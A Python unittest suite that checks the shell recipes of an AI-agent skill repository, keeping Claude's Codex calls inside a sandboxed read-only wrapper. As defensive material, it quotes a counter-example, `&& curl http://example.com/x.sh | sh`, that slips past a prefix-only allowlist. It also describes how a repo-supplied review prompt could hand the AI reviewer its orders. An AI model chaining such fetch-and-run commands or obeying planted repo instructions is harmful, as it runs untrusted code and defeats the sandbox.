#!/usr/bin/env python3
"""The skills are executable documents. These are the rules their commands must keep.

A skill's shell block is not prose: Claude runs it. Three defects from the audit of
2026-08-30 lived in those blocks with a passing test suite underneath them, because
nothing here ever looked at the recipes:

  * `plan-review` and `setup` called `codex exec` directly, against the repo's own rule
    ("Auch Ping und Resume laufen über den Wrapper") -- giving up the sandbox pin, the
    path bounds, the stderr file, the timeout and the MCP shutdown at once.
  * both plan-review skills ran `"$(cat REVIEW_PROMPT)"`, a file no step creates: an
    empty prompt on a clean repo, and a repo-supplied reviewer instruction otherwise.
  * `build` told the reader that bare `mktemp` avoids `/tmp`, two paragraphs after
    forbidding `/tmp`.

    python -m unittest discover -s tests -v
"""

from __future__ import annotations

import re
import unittest
from pathlib import Path

REPO = Path(__file__).resolve().parent.parent
SKILLS = sorted((REPO / "skills").glob("*/SKILL.md"))
BUILD_SKILL = REPO / "skills" / "build" / "SKILL.md"

# An empty glob would make every contract test below pass by iterating nothing --
# the failure mode where a suite reports green because it checked no files at all.
# (CodeRabbit, 2026-08-30.)
assert SKILLS, f"no SKILL.md found under {REPO / 'skills'} — the contract tests would be vacuous"
assert BUILD_SKILL.is_file(), f"expected the build skill at {BUILD_SKILL}"

# The build skill's own step IS the write: the wrapper exists to make writes
# impossible, so `build` must not be routed through it.
WRAPPER_EXEMPT = {"build"}

FENCE_RE = re.compile(r"```(?:bash|sh|shell)\n(.*?)```", re.S)


def command_blocks(path):
    """Shell fences, minus comment lines and the ⛔ counter-examples in prose.

    A block is only a rule violation if it is offered AS the command to run; the
    skills deliberately quote what NOT to do, and those live in prose, not fences.
    """
    for block in FENCE_RE.findall(path.read_text(encoding="utf-8")):
        lines = [ln for ln in block.splitlines() if not ln.strip().startswith("#")]
        yield "\n".join(lines)


# --- docs/audit/2026-09-11-scope.md §5 E-3 -- the `--expect-workdir "$TARGET"` contract -----------
#
# T10/T11 need one entry per wrapper CALL, not per code block. `_invoking_blocks`
# above returns whole fences -- fine for "does this block mention --model", useless
# for "does THIS call carry --expect-workdir", because a second unmarked call in the
# same fence, or a TARGET= line hiding after the first call, is invisible at block
# granularity. The 2026-09-11 scope plan (summarised in
# docs/audit/2026-09-11-scope.md) spelled out the grammar this extractor holds to.

INVOCATION_START_RE = re.compile(r"python3?\s+(?:tools|scripts)/codex_ro\.py\s+--")
# Same pattern, anchored to the START of a (logical) line -- used only to find
# the textual POSITION of the first real call in a whole file, for the T11
# ordering check. A call is never preceded on its own line by other text in any
# of the invocations this repo ships; an echo/prose mention is, which is exactly
# what excludes it here without a quote-parity check.
INVOCATION_LINE_RE = re.compile(r"^\s*python3?\s+(?:tools|scripts)/codex_ro\.py\s+--", re.MULTILINE)
TARGET_LINE_RE = re.compile(r"^[ \t]*TARGET=(.*)$", re.MULTILINE)
ECHO_TARGET_RE = re.compile(r"^[ \t]*echo\b.*\$TARGET", re.MULTILINE)
TARGET_PLACEHOLDER = "'<target= argument>'"


def _target_rhs_ok(rhs):
    """The only right-hand side E-3.2 allows for a `TARGET=` line.

    Anything else -- `"$PWD"`, `"$(pwd)"`, a backtick form, `.`, empty -- is
    exactly the class of self-confirming value the incident (11.09.2026) was
    caused by: a session deriving its own "expected" directory from itself.
    """
    return rhs.strip() == TARGET_PLACEHOLDER


def _split_top_level(line):
    """Split `line` on `;`, `&&`, `|` outside of quotes.

    Not a full shell grammar -- just enough to separate two commands chained on
    one line without also splitting inside a `--prompt-file "a;b"`-style argument
    or an `echo "... | ..."` string.
    """
    parts, buf, quote, i, n = [], [], None, 0, len(line)
    while i < n:
        ch = line[i]
        if quote:
            buf.append(ch)
            if ch == quote and line[i - 1] != "\\":
                quote = None
            i += 1
            continue
        if ch in "\"'":
            quote = ch
            buf.append(ch)
            i += 1
            continue
        if line[i : i + 2] == "&&":
            parts.append("".join(buf))
            buf = []
            i += 2
            continue
        if ch in ";|":
            parts.append("".join(buf))
            buf = []
            i += 1
            continue
        buf.append(ch)
        i += 1
    parts.append("".join(buf))
    return parts


def _quote_parity_odd(prefix):
    """True when `prefix` ends inside an open quote (naive, ' and " pooled).

    Good enough to tell "the match sits right after `echo "run: `" (one open
    quote before it) from "the match is the first thing on the line" (zero) --
    which is the whole distinction T10's fixtures need.
    """
    count = 0
    for i, ch in enumerate(prefix):
        if ch in "\"'" and (i == 0 or prefix[i - 1] != "\\"):
            count += 1
    return count % 2 == 1


def extract_invocations(fence_text):
    """Every shell command in `fence_text` that actually RUNS the wrapper.

    Joins `\\`-continued lines into one logical line, drops whole-line comments,
    splits chained commands at the top level, and returns each resulting command
    whose call to codex_ro.py is not itself sitting inside a quoted string (an
    `echo` line that documents the call is not a call). Fixtures for every branch
    live in InvocationExtractorTests below -- this function is unit-tested on its
    own before anything trusts it against the real skill files.
    """
    return [part for part in _commands(fence_text) if _is_recognised_invocation(part)]


def _commands(fence_text):
    """Top-level commands of a shell fence: continuations joined, whole-line
    comments dropped, chained commands split."""
    logical_lines = []
    pending = None
    for raw_line in fence_text.splitlines():
        if raw_line.strip().startswith("#"):
            # A whole-line comment drops out entirely; nothing here ever
            # backslash-continues out of a comment line.
            continue
        line = raw_line if pending is None else pending + " " + raw_line.strip()
        pending = None
        stripped = line.rstrip()
        if stripped.endswith("\\"):
            pending = stripped[:-1].rstrip()
            continue
        logical_lines.append(line)
    if pending is not None:
        logical_lines.append(pending)
    return [part.strip() for line in logical_lines for part in _split_top_level(line) if part.strip()]


def _is_recognised_invocation(part):
    m = INVOCATION_START_RE.search(part)
    # Inside an open quote it is an echo/prose mention, not a call.
    return bool(m) and not _quote_parity_odd(part[: m.start()])


# Commands that can NAME the wrapper without running it -- PROVIDED nothing in the
# command is itself executed: `echo` cannot run the wrapper, `echo $(…)` can. The
# first version of this list trusted the head alone, and the recheck of the closing
# gate walked straight through it. Deliberately short: the point of
# unaccounted_wrapper_mentions() is that an unfamiliar shape fails.
CANNOT_RUN_THE_WRAPPER = {"echo", "printf", "grep", "cp", "ls", "test", "[", "diff"}
# `$(…)`, backticks, `<(…)` and `>(…)` run what they contain, whatever heads the line.
EXECUTING_SUBSTITUTION_RE = re.compile(r"\$\(|`|[<>]\(")


def unaccounted_wrapper_mentions(fence_text):
    """Commands that mention codex_ro.py and are NOT a recognised invocation.

    The closing gate (code-review, 2026-09-18) pointed out that the extractor
    above is a recogniser, and a recogniser fails OPEN: `python -u
    tools/codex_ro.py …`, `py tools/codex_ro.py …`, `"$PY" tools/codex_ro.py …`
    or `./tools/codex_ro.py …` are all real calls it does not see -- so T10
    stayed green for a call without --expect-workdir, simply by not looking like
    the calls it knows. This is the complement: whatever names the wrapper in a
    shell fence is either a recognised invocation, a command that cannot run it
    AND substitutes nothing executable, or a test failure. New shapes get
    taught to the extractor, not waved through.
    """
    strays = []
    for part in _commands(fence_text):
        if "codex_ro.py" not in part or _is_recognised_invocation(part):
            continue
        harmless_head = part.split()[0] in CANNOT_RUN_THE_WRAPPER
        if harmless_head and not EXECUTING_SUBSTITUTION_RE.search(part):
            continue
        strays.append(part)
    return strays


# TARGET as a word of its own, not `$TARGET`/`${TARGET…}` (a use) and not part of
# a longer identifier (`MY_TARGET`, `TARGET_DIR`). `<TARGET>` is a prose
# placeholder, not a shell word: `docs-backfill` has a tunable of that name (the
# path to document) and writes `git diff -U0 <TARGET>` -- it never sets it.
BARE_TARGET_RE = re.compile(r"(?<![\w${<])TARGET(?!\w)")
# `${TARGET:=x}` / `${TARGET=x}` assign through an expansion.
ASSIGNING_EXPANSION_RE = re.compile(r"\$\{TARGET:?=")


def irregular_target_lines(fence_text):
    """Every line that sets TARGET in any way other than the one canonical line.

    Second half of the same gate finding: TARGET_LINE_RE only sees a line that
    STARTS with `TARGET=`. `export TARGET="$PWD"`, `read -r TARGET`,
    `TARGET+=…`, `declare TARGET=…`, `: "${TARGET:=$PWD}"` all set it and none
    matched, so "the only permitted right-hand side is the placeholder" held
    for one spelling of an assignment only. Rule now: a bare `TARGET` word in a
    shell fence appears in exactly one form -- the canonical placeholder line.
    """
    canonical = f"TARGET={TARGET_PLACEHOLDER}"
    bad = []
    for line in fence_text.splitlines():
        stripped = line.strip()
        if stripped.startswith("#") or stripped == canonical:
            continue
        if BARE_TARGET_RE.search(stripped) or ASSIGNING_EXPANSION_RE.search(stripped):
            bad.append(stripped)
    return bad


def _raw_fences(path):
    """Shell fences WITHOUT the comment-stripping `command_blocks` does.

    `extract_invocations` needs to see comment lines itself, to prove it drops
    them rather than relying on a caller to have done that already.
    """
    return FENCE_RE.findall(path.read_text(encoding="utf-8"))


def _invocations_in_file(path):
    found = []
    for fence in _raw_fences(path):
        found.extend(extract_invocations(fence))
    return found


CANON_BEGIN = "<!-- claudex-target:begin -->"
CANON_END = "<!-- claudex-target:end -->"


def _canonical_section(path):
    text = path.read_text(encoding="utf-8")
    start = text.find(CANON_BEGIN)
    end = text.find(CANON_END)
    if start == -1 or end == -1:
        return None
    return text[start : end + len(CANON_END)]


BETRIEB = REPO / "docs" / "betrieb.md"
ALL_TARGET_DOC_FILES = SKILLS + [BETRIEB]
assert BETRIEB.is_file(), f"expected {BETRIEB}"

# The files that actually call the wrapper -- computed, not enumerated by hand,
# so a file that stops calling the wrapper (or starts calling it) is picked up
# automatically instead of silently falling out of coverage. `build` never
# calls it (wrapper-exempt by design) and `docs-backfill` only names it inside
# a prose code span, never in a ```bash/sh/shell fence -- both are expected to
# be absent here, not exempted by name.
INVOKING_FILES = [p for p in ALL_TARGET_DOC_FILES if _invocations_in_file(p)]
assert INVOKING_FILES, (
    "no file with a real codex_ro.py invocation was found -- the target "
    "contract tests below would be vacuous"
)


class WrapperContractTests(unittest.TestCase):
    def test_no_skill_calls_codex_exec_directly(self):
        for path in SKILLS:
            if path.parent.name in WRAPPER_EXEMPT:
                continue
            for block in command_blocks(path):
                with self.subTest(skill=path.parent.name):
                    self.assertNotRegex(
                        block,
                        r"(^|\s|\|)codex\s+exec\b",
                        f"{path.parent.name} runs codex directly; use tools/codex_ro.py "
                        f"(docs/betrieb.md: 'Auch Ping und Resume laufen über den Wrapper')",
                    )

    def test_the_build_skill_is_the_only_exemption_and_says_why(self):
        text = BUILD_SKILL.read_text(encoding="utf-8")
        self.assertIn("does NOT go through", text, "the exemption has to be justified in place")


class ModelResolutionContractTests(unittest.TestCase):
    """A skill that reads the role config must also PASS what it read.

    Three skills resolved the actor and then invoked the wrapper without
    `--model`/`--effort`, leaving it on its own defaults — the exact drift the
    doctrine ("the skill never chooses a model") exists to prevent, hiding behind
    a line of prose that said otherwise. (CodeRabbit, 2026-08-30.)
    """

    # `setup`'s connectivity ping is deliberately outside this rule: it is not a
    # review, it runs at `--effort low` on purpose, and it happens while wiring a
    # repo up -- i.e. possibly BEFORE any role config exists. Making it resolve a
    # role would make the verification step depend on the thing it is verifying.
    MODEL_EXEMPT = {"setup"}

    @classmethod
    def _invoking_blocks(cls, path):
        """Blocks that RUN the wrapper. Naming it in prose is not invoking it."""
        if path.parent.name in cls.MODEL_EXEMPT:
            return []
        return [b for b in command_blocks(path) if re.search(r"codex_ro\.py\s+--", b)]

    def test_every_wrapper_call_carries_a_model_and_effort(self):
        for path in SKILLS:
            for block in self._invoking_blocks(path):
                with self.subTest(skill=path.parent.name, block=block[:50]):
                    self.assertIn(
                        "--model", block,
                        f"{path.parent.name}: resolve the role, then pass --model/--effort",
                    )
                    self.assertIn("--effort", block, f"{path.parent.name}: --effort missing")

    def test_a_skill_invoking_the_wrapper_resolves_the_role_first(self):
        for path in SKILLS:
            if not self._invoking_blocks(path):
                continue
            with self.subTest(skill=path.parent.name):
                self.assertIn(
                    "claudex_roles.py --spec", path.read_text(encoding="utf-8"),
                    f"{path.parent.name} builds a wrapper call but never resolves the role",
                )


class PromptFileContractTests(unittest.TestCase):
    def test_no_skill_reads_an_uncreated_review_prompt_file(self):
        for path in SKILLS:
            for block in command_blocks(path):
                with self.subTest(skill=path.parent.name):
                    self.assertNotIn(
                        "cat REVIEW_PROMPT",
                        block,
                        f"{path.parent.name}: REVIEW_PROMPT is created by no step. On a "
                        f"clean repo this launches an EMPTY prompt; on a repo that ships "
                        f"the file, the repo under review writes the reviewer's orders.",
                    )

    def test_prompts_are_passed_by_file_not_by_substitution(self):
        for path in SKILLS:
            for block in command_blocks(path):
                if "codex_ro.py" not in block:
                    continue
                with self.subTest(skill=path.parent.name):
                    self.assertNotRegex(
                        block,
                        r'--prompt\s+"?\$\(',
                        "command substitution into --prompt; use --prompt-file",
                    )


class TempDirContractTests(unittest.TestCase):
    def test_no_skill_uses_a_bare_mktemp(self):
        """Bare `mktemp` lands in /tmp on Linux and macOS, which the skills forbid.

        Matches an mktemp whose arguments are only flags -- `$(mktemp)`,
        `$(mktemp -d)`, `mktemp -t x` -- and lets one with a path template
        through. The first version only caught `mktemp)` and would have missed
        `$(mktemp -d)` entirely. (CodeRabbit, 2026-08-30.)
        """
        # Flags MAY take a value (`mktemp -t x`), so a flag's argument has to be
        # consumed too -- otherwise `$(mktemp -t x)` reads as "has a template".
        # A real template contains a path separator or a variable; a bare word
        # after a flag does not. (CodeRabbit, 2026-08-30.)
        bare = re.compile(r"mktemp(\s+-[^\s)]+(\s+[^\s)$/\\]+)?)*\s*[)\n]")
        for path in SKILLS:
            for block in command_blocks(path):
                with self.subTest(skill=path.parent.name):
                    self.assertIsNone(
                        bare.search(block),
                        f"{path.parent.name}: give mktemp a template under $SCRATCH_DIR",
                    )

    def test_no_skill_writes_to_a_literal_tmp_path(self):
        for path in SKILLS:
            for block in command_blocks(path):
                with self.subTest(skill=path.parent.name):
                    self.assertNotIn("/tmp/", block, f"{path.parent.name}: ⛔ never /tmp")


class ScopeGrammarTests(unittest.TestCase):
    """The fallback verdict grammar must follow the SELECTED scope.

    code-review hard-coded all five verdicts into --require-verdicts while its own
    default scope is three (dod,quality,security). During a Codex outage the
    fallback then rejected a perfectly good reply for "missing" verdicts nobody
    had asked for -- so the documented degradation path failed on every default
    run (audit 2026-08-30).
    """

    def setUp(self):
        self.text = (
            Path(__file__).resolve().parent.parent / "skills" / "code-review" / "SKILL.md"
        ).read_text(encoding="utf-8")

    def test_the_grammar_is_derived_not_hard_coded(self):
        for block in FENCE_RE.findall(self.text):
            if "--require-verdicts" not in block:
                continue
            with self.subTest(block=block[:60]):
                self.assertNotRegex(
                    block,
                    r'--require-verdicts\s+"[A-Z]',
                    "build --require-verdicts from $SCOPE instead of writing it out",
                )

    def test_every_documented_scope_has_a_verdict_pair(self):
        for scope in ("dod", "quality", "security", "docs", "tests"):
            with self.subTest(scope=scope):
                self.assertRegex(self.text, rf"\n\s*{scope}\)\s+g=", "missing from the case arms")

    def test_no_associative_arrays(self):
        """macOS ships bash 3.2, which has none — a syntax error, not a fallback."""
        for path in SKILLS:
            for block in command_blocks(path):
                with self.subTest(skill=path.parent.name):
                    self.assertNotIn("declare -A", block)


class RoundVariableTests(unittest.TestCase):
    """A per-round filename needs the round to actually change."""

    def test_a_skill_using_round_in_a_path_also_initialises_it(self):
        for path in SKILLS:
            text = path.read_text(encoding="utf-8")
            if "-r$ROUND" not in text:
                continue
            with self.subTest(skill=path.parent.name):
                self.assertRegex(
                    text,
                    r"ROUND=\d|ROUND=\$\(\(ROUND",
                    f"{path.parent.name} names files by $ROUND but never sets it — "
                    f"a fix round then overwrites the previous report",
                )


class InvocationExtractorTests(unittest.TestCase):
    """Unit tests for extract_invocations, on inline fixtures -- the 2026-09-11 scope plan's
    fixture table, proven here before anything trusts the function against a
    real file below.
    """

    def test_backslash_continuation_is_one_invocation(self):
        fence = (
            'python tools/codex_ro.py --expect-workdir "$TARGET" \\\n'
            '  --model "$MODEL" --effort "$EFFORT" \\\n'
            '  --out-file "$OUT"\n'
        )
        found = extract_invocations(fence)
        self.assertEqual(len(found), 1, found)
        self.assertIn("--expect-workdir", found[0])
        self.assertIn("--out-file", found[0])

    def test_two_invocations_one_block_only_first_marked_is_two_calls(self):
        fence = (
            'python tools/codex_ro.py --expect-workdir "$TARGET" --out-file a.txt\n'
            "python tools/codex_ro.py --out-file b.txt\n"
        )
        found = extract_invocations(fence)
        self.assertEqual(len(found), 2, found)
        self.assertIn("--expect-workdir", found[0])
        self.assertNotIn("--expect-workdir", found[1])

    def test_commented_invocation_is_not_a_call(self):
        self.assertEqual(
            extract_invocations("# python tools/codex_ro.py --out-file a.txt\n"), []
        )

    def test_invocation_inside_echo_prose_is_not_a_call(self):
        fence = 'echo "run: python tools/codex_ro.py --out-file a.txt"\n'
        self.assertEqual(extract_invocations(fence), [])

    def test_scripts_variant_is_also_recognised(self):
        found = extract_invocations("python3 scripts/codex_ro.py --out-file a.txt\n")
        self.assertEqual(len(found), 1)


class TargetPlaceholderCheckerTests(unittest.TestCase):
    """T11/E-3.2: proves the RHS checker itself rejects every forbidden form,
    on synthetic fixtures -- so a later loosening of `_target_rhs_ok` breaks
    here first, not silently in a shipped skill. the 2026-09-11 scope plan's fixture row
    ('TARGET="$PWD"' etc. -> rot) is exactly this list.
    """

    def test_the_placeholder_itself_is_accepted(self):
        self.assertTrue(_target_rhs_ok(TARGET_PLACEHOLDER))

    def test_every_derived_or_empty_form_is_rejected(self):
        for bad in (
            '"$PWD"',
            "$PWD",
            '"$(pwd)"',
            "$(pwd)",
            "`pwd`",
            ".",
            '"."',
            "",
            "   ",
            '"/absoluter/pfad/zum/zielrepo"',  # the OLD, non-binding stanza
        ):
            with self.subTest(bad=bad):
                self.assertFalse(_target_rhs_ok(bad))


class TargetOrderingCheckerTests(unittest.TestCase):
    """T11: TARGET= and its echo must textually precede the first invocation.
    Proven on synthetic text first -- the 2026-09-11 scope plan's three ordering fixtures
    (before/after/never-set) -- before the same regexes are pointed at the
    real files below.
    """

    def test_target_and_echo_before_call_both_found_and_ordered(self):
        text = (
            "TARGET='<target= argument>'\n"
            'echo "Review scope: $TARGET"\n'
            'python tools/codex_ro.py --expect-workdir "$TARGET" --out-file a.txt\n'
        )
        target_m, echo_m, call_m = (
            TARGET_LINE_RE.search(text),
            ECHO_TARGET_RE.search(text),
            INVOCATION_LINE_RE.search(text),
        )
        self.assertTrue(target_m and echo_m and call_m)
        self.assertLess(target_m.start(), call_m.start())
        self.assertLess(echo_m.start(), call_m.start())

    def test_target_set_after_the_call_is_detected_as_out_of_order(self):
        text = (
            'python tools/codex_ro.py --expect-workdir "$TARGET" --out-file a.txt\n'
            "TARGET='<target= argument>'\n"
        )
        target_m = TARGET_LINE_RE.search(text)
        call_m = INVOCATION_LINE_RE.search(text)
        self.assertTrue(target_m and call_m)
        self.assertGreater(target_m.start(), call_m.start())

    def test_target_never_set_leaves_no_match_at_all(self):
        text = 'python tools/codex_ro.py --expect-workdir "$TARGET" --out-file a.txt\n'
        self.assertIsNone(TARGET_LINE_RE.search(text))
        self.assertIsNotNone(INVOCATION_LINE_RE.search(text))


class TargetContractTests(unittest.TestCase):
    """T10/T11/E-3 against the real files (docs/audit/2026-09-11-scope.md §5). A vacuous pass --
    the files-list computed but empty -- is the exact failure mode PLAN.md
    warns about (see the module-level assert on INVOKING_FILES); this class
    only runs once that assert has already held.
    """

    def test_invoking_files_are_exactly_the_files_with_a_real_call(self):
        expected = {p for p in ALL_TARGET_DOC_FILES if _invocations_in_file(p)}
        self.assertEqual(set(INVOKING_FILES), expected)
        # The five skills that call the wrapper, plus betrieb.md. `build` and
        # `docs-backfill` must NOT be in here (see ALL_TARGET_DOC_FILES docstring).
        names = {p.name for p in INVOKING_FILES}
        for must_invoke in ("plan-review", "claudex-loop", "code-review", "audit", "setup"):
            self.assertIn(
                must_invoke,
                {p.parent.name for p in INVOKING_FILES},
                f"{must_invoke}/SKILL.md has no detected wrapper call",
            )
        self.assertNotIn(
            "build", {p.parent.name for p in INVOKING_FILES}, "build is wrapper-exempt"
        )
        self.assertNotIn(
            "docs-backfill",
            {p.parent.name for p in INVOKING_FILES},
            "docs-backfill only mentions the wrapper in prose, never in a fence",
        )

    def test_every_real_invocation_carries_expect_workdir_target(self):
        for path in INVOKING_FILES:
            for call in _invocations_in_file(path):
                with self.subTest(file=f"{path.parent.name}/{path.name}", call=call[:70]):
                    self.assertIn(
                        '--expect-workdir "$TARGET"',
                        call,
                        f"{path}: wrapper call missing --expect-workdir \"$TARGET\": {call!r}",
                    )

    def test_target_and_echo_precede_the_first_invocation_in_every_file(self):
        for path in INVOKING_FILES:
            text = path.read_text(encoding="utf-8")
            target_m = TARGET_LINE_RE.search(text)
            echo_m = ECHO_TARGET_RE.search(text)
            call_m = INVOCATION_LINE_RE.search(text)
            with self.subTest(file=f"{path.parent.name}/{path.name}"):
                self.assertIsNotNone(target_m, f"{path}: no TARGET= assignment found")
                self.assertIsNotNone(echo_m, f"{path}: no echo of $TARGET found")
                self.assertIsNotNone(call_m, f"{path}: no invocation found")
                self.assertLess(
                    target_m.start(), call_m.start(), f"{path}: TARGET= comes after the first call"
                )
                self.assertLess(
                    echo_m.start(), call_m.start(), f"{path}: echo comes after the first call"
                )

    def test_target_rhs_is_only_ever_the_placeholder(self):
        for path in INVOKING_FILES:
            text = path.read_text(encoding="utf-8")
            matches = list(TARGET_LINE_RE.finditer(text))
            with self.subTest(file=f"{path.parent.name}/{path.name}"):
                self.assertTrue(matches, f"{path}: no TARGET= line found")
                for m in matches:
                    rhs = m.group(1)
                    self.assertTrue(
                        _target_rhs_ok(rhs),
                        f"{path}: TARGET= must stay the literal placeholder, found {rhs!r}",
                    )


class FailClosedComplementTests(unittest.TestCase):
    """The extractor and TARGET_LINE_RE recognise; these two refuse the rest.

    Run over ALL_TARGET_DOC_FILES, not INVOKING_FILES: a file whose only call
    has an unfamiliar shape is, by construction, not in INVOKING_FILES.
    """

    def test_unfamiliar_call_shapes_are_flagged_not_skipped(self):
        for call in (
            'python -u tools/codex_ro.py --model "$MODEL" --out-file v.txt',
            'py tools/codex_ro.py --out-file v.txt',
            '"$PY" tools/codex_ro.py --out-file v.txt',
            './tools/codex_ro.py --out-file v.txt',
            'python3 tools/codex_ro.py -c x=y --out-file v.txt',
            'true && python -u scripts/codex_ro.py --out-file v.txt',
            # Recheck finding (2026-09-18): a harmless HEAD does not make a harmless
            # command. `echo` cannot run the wrapper; what it substitutes can.
            'echo $(python -u tools/codex_ro.py --out-file v.txt)',
            'echo "$(python -u tools/codex_ro.py --out-file v.txt)"',
            'echo `python -u tools/codex_ro.py --out-file v.txt`',
            'grep x <(python -u tools/codex_ro.py --out-file v.txt)',
            'printf "%s" "$(./tools/codex_ro.py --out-file v.txt)"',
        ):
            with self.subTest(call=call):
                self.assertTrue(unaccounted_wrapper_mentions(call), "must be flagged")

    def test_known_shapes_and_harmless_mentions_are_not_flagged(self):
        for ok in (
            'python tools/codex_ro.py --expect-workdir "$TARGET" --out-file v.txt',
            'python3 scripts/codex_ro.py --expect-workdir "$TARGET" \\\n  --out-file v.txt',
            'echo "run: python tools/codex_ro.py --out-file v.txt"',
            "cp scripts/codex_ro.py tools/codex_ro.py",
            "# python -u tools/codex_ro.py --out-file v.txt",
        ):
            with self.subTest(ok=ok):
                self.assertEqual(unaccounted_wrapper_mentions(ok), [])

    def test_every_other_way_of_setting_target_is_flagged(self):
        for line in (
            'export TARGET="$PWD"',
            "export TARGET",
            "read -r TARGET",
            'TARGET+="/sub"',
            'declare TARGET="$(pwd)"',
            'local TARGET=.',
            ': "${TARGET:=$PWD}"',
            'TARGET="$PWD"',
            "TARGET=",
            "  TARGET='<target= argument>' ; TARGET=$PWD",
        ):
            with self.subTest(line=line):
                self.assertTrue(irregular_target_lines(line), "must be flagged")

    def test_the_canonical_line_and_plain_uses_are_not_flagged(self):
        fence = (
            "# TARGET is the literal value of the skill argument target=\n"
            f"TARGET={TARGET_PLACEHOLDER}\n"
            'echo "Review scope: $TARGET"\n'
            'python tools/codex_ro.py --expect-workdir "$TARGET" --out-file "${TARGET}/v.txt"\n'
            'MY_TARGET=1; TARGET_DIR=x\n'
            "git diff -U0 <TARGET> | grep -E '^[+-]'\n"
        )
        self.assertEqual(irregular_target_lines(fence), [])

    def test_no_checked_file_ships_an_unaccounted_call_or_an_irregular_target(self):
        for path in ALL_TARGET_DOC_FILES:
            for fence in _raw_fences(path):
                with self.subTest(file=f"{path.parent.name}/{path.name}"):
                    self.assertEqual(
                        unaccounted_wrapper_mentions(fence), [],
                        f"{path}: names the wrapper in a shape the extractor does not "
                        f"know — teach extract_invocations() the shape, do not skip it",
                    )
                    self.assertEqual(
                        irregular_target_lines(fence), [],
                        f"{path}: TARGET may only be set by the canonical placeholder line",
                    )


class CanonicalTargetSectionTests(unittest.TestCase):
    """docs/audit/2026-09-11-scope.md §5 E-3.1: one section, byte-identical everywhere it is
    required. Six skills built six different stanzas before this was made
    mandatory (Runde 4) -- a paraphrase in one file is a seventh variant.
    """

    def test_every_invoking_file_carries_the_section(self):
        for path in INVOKING_FILES:
            with self.subTest(file=f"{path.parent.name}/{path.name}"):
                self.assertIsNotNone(
                    _canonical_section(path),
                    f"{path}: missing <!-- claudex-target:begin/end --> section",
                )

    def test_the_section_is_byte_identical_across_every_invoking_file(self):
        sections = {f"{p.parent.name}/{p.name}": _canonical_section(p) for p in INVOKING_FILES}
        self.assertTrue(all(sections.values()), sections)
        distinct = set(sections.values())
        self.assertEqual(
            len(distinct), 1, f"canonical target section differs across files: {sorted(sections)}"
        )


class BetriebCounterExampleTests(unittest.TestCase):
    """docs/betrieb.md keeps a deliberate ⛔ counter-example showing why a
    prefix-only allowlist is unsafe (`codex_ro.py ... && curl ... | sh`). It
    must stay untouched AND stay out of the invocation extractor's count --
    proven explicitly rather than left as an accident of the fence tag: the
    example lives in a plain ``` fence (no `bash`/`sh`/`shell` tag), so neither
    FENCE_RE nor extract_invocations ever look at it as a real command.
    """

    def test_the_chaining_example_is_present_but_not_extracted(self):
        text = BETRIEB.read_text(encoding="utf-8")
        self.assertIn("&& curl http://example.com/x.sh | sh", text)
        for call in _invocations_in_file(BETRIEB):
            self.assertNotIn("curl", call)

    def test_no_other_wrapper_call_hides_in_a_fence_the_extractor_skips(self):
        """The fence tag is the extractor's blind spot, so it gets its own rule.

        Everything above reads ```bash/sh/shell fences only. A wrapper call put
        into an untagged, indented or ```powershell fence would carry no
        --expect-workdir and no test would see it -- the same vacuous green the
        header of this file warns about. So: across every checked file, a line
        that runs the wrapper outside a shell fence must be the one chaining
        counter-example, and nothing else.
        """
        any_fence = re.compile(r"^[ \t]*```([^\n`]*)\n(.*?)^[ \t]*```", re.S | re.M)
        strays = []
        for path in [*SKILLS, BETRIEB]:
            for tag, body in any_fence.findall(path.read_text(encoding="utf-8")):
                if tag.strip() in {"bash", "sh", "shell"}:
                    continue
                for line in body.splitlines():
                    if line.strip().startswith("#") or not re.search(r"codex_ro\.py\s+--", line):
                        continue
                    if "&& curl http://example.com/x.sh | sh" in line:
                        continue
                    strays.append(f"{path.name}: ```{tag.strip() or '(untagged)'}: {line.strip()}")
        self.assertEqual(
            strays, [],
            "a wrapper call in a fence the extractor never reads — tag it bash "
            "and give it --expect-workdir, or it ships unchecked",
        )


class TabuScopeContractTests(unittest.TestCase):
    def test_setup_skill_states_the_path_neutral_tabu_rule(self):
        """T13 (weak by design, docs/audit/2026-09-11-scope.md §7): `setup` only INSTRUCTS an
        agent to write a taboo scope into a TARGET project's AGENTS.md later --
        there is no template file here whose effect this suite could check.
        This only proves the rule text is present in the skill, not that a
        later run obeys it.
        """
        text = (REPO / "skills" / "setup" / "SKILL.md").read_text(encoding="utf-8")
        self.assertRegex(
            text,
            r"pfadneutral|path-?neutral",
            "setup/SKILL.md must tell the agent to write taboo entries "
            "path-neutral/categorical, never with a real customer/person/host name",
        )


class BetriebDocAccuracyTests(unittest.TestCase):
    """docs/audit/2026-09-11-scope.md §8: docs/betrieb.md claimed --skip-git-repo-check
    is 'never' set, and that the git check limits Codex's writable root to the
    repo. Both are false -- build_argv() passes the flag unconditionally since
    2026-09-09, and the 'writable root' theory was measured and falsified on
    upstream PR #15 (workspace-write binds to cwd, not the repo root).
    """

    def setUp(self):
        self.text = BETRIEB.read_text(encoding="utf-8")

    def test_the_never_set_claim_is_gone(self):
        self.assertNotRegex(
            self.text,
            r"wird\s+\*\*nie\*\*\s+gesetzt",
            "betrieb.md still claims --skip-git-repo-check is never set",
        )

    def test_the_flag_is_now_described_as_unconditionally_passed(self):
        self.assertIn("--skip-git-repo-check", self.text)
        self.assertRegex(
            self.text,
            r"unbedingt",
            "betrieb.md must describe --skip-git-repo-check as passed unconditionally",
        )


if __name__ == "__main__":
    unittest.main(verbosity=2)
